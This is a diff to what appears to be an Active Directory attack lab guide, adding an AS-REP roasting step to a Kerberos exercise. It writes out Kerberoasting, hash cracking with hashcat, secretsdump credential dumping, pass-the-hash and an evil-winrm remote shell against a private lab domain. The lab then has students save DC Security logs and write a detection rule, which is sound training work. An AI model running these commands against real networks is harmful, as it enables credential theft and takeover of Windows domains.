@@ -102,15 +102,16 @@ impacket-GetUserSPNs -dc-ip 192.168.56.10 ceh.lab/a.fahmy -request      # → sv
 #   save both $krb5tgs$ hashes to spn.txt
 hashcat -m 13100 spn.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 hashcat -m 13100 spn.txt --show                                          # svc_backup cracks; svc_sql: Exhausted (strong pw)
-# AS-REP roast (any no-preauth account):
-impacket-GetNPUsers -dc-ip 192.168.56.10 ceh.lab/ -usersfile users.txt -no-pass
+# AS-REP roast (svc_legacy has pre-auth disabled — seed: lab_s4_dc_setup.ps1 -Stage ASREPRoast):
+impacket-GetNPUsers -dc-ip 192.168.56.10 ceh.lab/ -usersfile users.txt -no-pass -format hashcat
+hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt   # svc_legacy cracks — with NO starting credential
 # pass-the-hash + a shell (no cracking):
 impacket-secretsdump ceh.lab/svc_backup@192.168.56.10
 nxc smb 192.168.56.20 -u Administrator -H <NT-hash>
 evil-winrm -i 192.168.56.20 -u svc_backup -p '<cracked>'
 # SAVE the DC Security log:  wevtutil epl Security lab6_kerberoast.evtx
 ```
-✓ svc_backup cracked (13100); svc_sql roasted but never cracks (the honest limit); pass-the-hash proven; 4769 burst saved.
+✓ svc_backup cracked (13100); svc_sql roasted but never cracks (the honest limit); svc_legacy AS-REP roasted (18200) with no credential; pass-the-hash proven; 4768/4769 evidence saved.
 
 ## Lab 7 — write the detection rule (16 min) → the signature exercise
 ```powershell
